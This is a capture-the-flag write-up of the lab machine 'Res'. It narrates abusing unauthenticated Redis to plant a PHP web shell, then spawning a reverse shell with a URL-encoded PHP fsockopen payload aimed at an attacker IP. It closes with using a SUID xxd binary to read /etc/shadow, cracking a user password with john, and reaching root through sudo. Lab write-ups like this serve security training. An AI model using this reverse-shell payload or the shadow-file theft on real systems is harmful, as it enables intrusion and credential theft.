Res

Target IP: 10.10.63.119

Scanning


There are two TCP ports open on the target machine: HTTP and Redis.

Enumeration

Port 6379: Redis

Performing enumeration on port 80 did not result in anything. However, this application looks interesting. Redis is a database management system. The target machine is running the version 6.0.7. Using redis-cli, I managed to connect to this port from my machine. The target host is not using any authentication either.

Exploitation


The target host is running Apache on port 80 and the write permissions are enabled for it. Using this technique, I wrote a simple web-shell, using the commands above, at /var/www/html and saved it as shell.php.


Now I have access to my simple web-shell at http://10.10.63.119/shell.php. Using the commamds id;whoami;ls;, I received the output above.


And now I have a reverse shell connection. Since the target host has PHP installed, I used a PHP reverse shell payload. The PHP payload I used is mentioned below. Now I have a foothold on the target machine.
PHP payload: php%20-r%20%27%24sock%3Dfsockopen%28%2210.14.55.153%22%2C8443%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27.
Full URL with PHP payload: http://10.10.63.119/shell.php?cmd=php%20-r%20%27%24sock%3Dfsockopen%28%2210.14.55.153%22%2C8443%29%3Bexec%28%22%2Fbin%2Fbash%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27.

Privilege Escalation


Looks like xxd has SUID bit set. I can use this to read the /etc/shadow file to get the password hash of the users of the system.


I only managed to obtain the password hash of the user vianka. I copied this hash to my local machine.


I ran john on this password hash successfully, as I obtained the password beautiful1 of the user vianka.


Using this password worked as I switched to the new user.


Now I have a root shell as the user can run all commands using sudo. I spawned a root bash shell.
